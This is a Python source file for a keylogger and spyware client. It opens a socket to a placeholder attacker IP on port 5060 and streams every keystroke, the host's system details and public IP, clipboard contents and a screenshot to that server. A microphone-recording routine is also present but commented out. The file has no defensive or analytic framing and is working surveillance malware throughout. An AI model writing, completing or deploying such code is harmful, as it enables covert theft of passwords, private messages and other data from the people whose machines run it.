from pynput.keyboard import Key, Listener
import socket
import platform
from requests import get
import win32clipboard
# import sounddevice as sd
import pyautogui
import io
# from scipy.io.wavfile import write 
# import numpy as np

SERVER = "place_ip_here" # PLEASE ADD THE DEVELOPER'S IP HERE
PORT = 5060

# output_audio_file = "output_audio.wav"

def send_to_server(msg, flag):
    if flag == 0:
        type = b'key  '
    elif flag == 1:
        type = b'sys  '
    else:
        type = b'clip '
    try:
        sock.send(type + len(msg).to_bytes(4, byteorder='big') + msg.encode("utf-8"))
    except:
        pass

def send_file_to_server(file_data, flag):
    # if flag == 0:
    #     type = b'audio'
    #     with open(file_data, 'rb') as f:
    #         for l in f: 
    #             try:
    #                 sock.sendall(type + len(l).to_bytes(4, byteorder='big') + l)
    #             except:
    #                 pass
    #         f.close()
    # else:
    type = b'image'
    try:
        sock.sendall(type + len(file_data).to_bytes(4, byteorder='big') + file_data)
    except:
        pass
    
def on_press(key):
    try:
        msg = str(key.char)
        print(msg)
        send_to_server(msg, 0)
    except AttributeError:
        msg = str(key)
        print(msg)
        send_to_server(msg, 0)
    
    
def on_release(key):
    if key == Key.esc:
        sock.close()
        return False

def get_system_info():
    name = socket.gethostname()
    addrs = socket.gethostbyname(name)
    processor = platform.processor()
    system_os = platform.system()
    version = platform.version()
    machine_info = platform.machine()
    public_ip = get('https://api.ipify.org').text
    return [f"name: {name}", f"addrs: {addrs}", f"processor: {processor}", f"system_os: {system_os}"
                  , f"version: {version}", f"machine_info: {machine_info}", f"public_ip: {public_ip}"]

def get_clipboard_info():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        pass

# def get_mic_info():
#     fs = 44100 
#     duration = 3
#     myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
#     sd.wait()
#     write(output_audio_file, fs, myrecording)
#     return output_audio_file

def get_screenshot():
    screenshot = pyautogui.screenshot()
    buffer = io.BytesIO()
    screenshot.save(buffer, format='PNG')
    return buffer.getvalue()
    
    
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER, PORT))
listener = Listener (on_press=on_press, on_release=on_release)
listener.start()
# print(get_system_info())
send_to_server(str(get_system_info()), 1)
print(get_clipboard_info())
send_to_server(get_clipboard_info(), 2)
# send_file_to_server(get_mic_info(), 0)
send_file_to_server(get_screenshot(), 1)
listener.join()
print("Goodbye")